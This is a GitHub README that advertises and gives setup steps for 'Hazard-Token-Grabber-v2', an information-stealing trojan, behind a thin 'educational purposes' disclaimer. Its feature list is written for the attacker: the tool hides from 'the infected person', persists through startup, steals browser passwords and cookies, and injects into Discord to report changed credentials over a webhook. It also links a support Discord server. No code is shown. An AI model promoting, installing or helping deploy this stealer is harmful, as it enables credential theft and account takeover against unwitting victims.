### <div align="center"> ☣ Hazard-Token-Grabber-v2 ☣

<div align="center">
    <img src="https://img.shields.io/github/languages/top/zappelig/Hazard-Token-Grabber-v2?color=%23000000">
    <img src="https://img.shields.io/github/stars/zappelig/Hazard-Token-Grabber-v2?color=%23000000&logoColor=%23000000">
    <br>
    <img src="https://img.shields.io/github/commit-activity/w/zappelig/Hazard-Token-Grabber-v2?color=%23000000"> 
    <img src="https://img.shields.io/github/last-commit/zappelig/Hazard-Token-Grabber-v2?color=%23000000&logoColor=%23000000">
    <br>
    <img src="https://img.shields.io/github/issues/zappelig/Hazard-Token-Grabber-v2?color=%23000000&logoColor=%23000000">
    <img src="https://img.shields.io/github/issues-closed/zappelig/Hazard-Token-Grabber-v2?color=%23000000&logoColor=%23000000">



### THIS PROJECT WAS CREATED FOR EDUCATIONAL PURPOSES!!! IT IS NONE OF MY BUSINESS WHAT YOU DO WITH IT, I CANNOT BE LIABLE AND BY USING THIS PROGRAM YOU AGREE TO THIS!! 

➼ ⚠ Credits to Rdimo ⚠

</div>
<hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">

![hazard-grabber](https://user-images.githubusercontent.com/96620548/199788080-2eaf09e2-de07-423e-86b9-7980c7165c01.png)
---------------------------------------------------------------------------------------------------
<hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">

Hello! I'm pretty new on Github! Some days ago I found my old Hazard-Grabber directory and a repost with some changes from someone else. Enjoy this small repost with a hopefully easy tutorial.


As I said - I'm new 👋, but I will try my best ♡
And yes, if you wanna call me that, you can call me a skid. That is the only thing I can do at the moment, but I'm trying to create my own projects. 


I'm learning coding at the moment to create my own projects as I mentioned before, but I'm pretty young and broke, so please don't hate me for copying/posting this stuff :)


### You would make me really happy if you ⭐ this repository if you like it!
---------------------------------------------------------------------------------------------------
<div align="center">

### 💉 **Installation and use**

</div>

It is really easy to set this up! Just get [python version 3.10](https://www.python.org/ftp/python/3.10.9/python-3.10.9-amd64.exe).

Click the blue/green "CODE" button on this page. Choose the option "DOWNLOAD ZIP". Or you can directly download the ZIP from [this link](https://github.com/Gumbobrot/Hazard-Token-Grabber-v2/archive/refs/heads/main.zip).

Extract to ZIP to your Desktop and enter the Hazard-Token-Grabber-v2 folder. In there, just run setup.bat and follow the instructions that it gives to you.

---------------------------------------------------------------------------------------------------
<div align="center">

### 📷 **Screenshots**

</div>

![hazard-v2](https://user-images.githubusercontent.com/96620548/200128638-acb433e6-551e-4f7a-861c-09cfd570fa7b.png)

<hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">

<div align="center">

### 🎈 **Hazard-Grabber is a popular Stealer with many features**

</div>

- Manipulating code and more 
> (If you don't like a feature, you can easily turn it off and change the code to whatever you want.)

- Hide it-self 
> (This feature, hides logs and more, so the infected person doesn't really know that he or she just got logged.)

- Start-Up injection 
> (If the infected User starts his PC, this feature will re-run the Trojan so you can get all his or her Passwords, Cookies and more again.)

- Password-Logger 
> (Logs all Google Chrome Passwords.This feature also supports some other browsers like Opera GX, Brave and others.)

- Cookie-Logger 
> (Logs all Google Chrome Cookies. This feature also supports some other browsers like Opera GX, Brave and others.)

- Discord Injection 
> (Auto-Update. If the infected User changes his password, email or phone it will be displayed through the webhook to you.)
------------------------------------------------------------------------------------------------------------
### 📝 **If you have any other improvement ideas or questions, just ask me on Discord or join our server!**

- [Contact me here!](https://discordlookup.com/user/916601585038131222)


- [Our Discord here!](https://discord.gg/s3RVzKjteg)                                                                                                                                                                      
------------------------------------------------------------------------------------------------------------
⏳ *Thanks to everyone who took the time to read through this slightly longer tutorial! ↑↑*
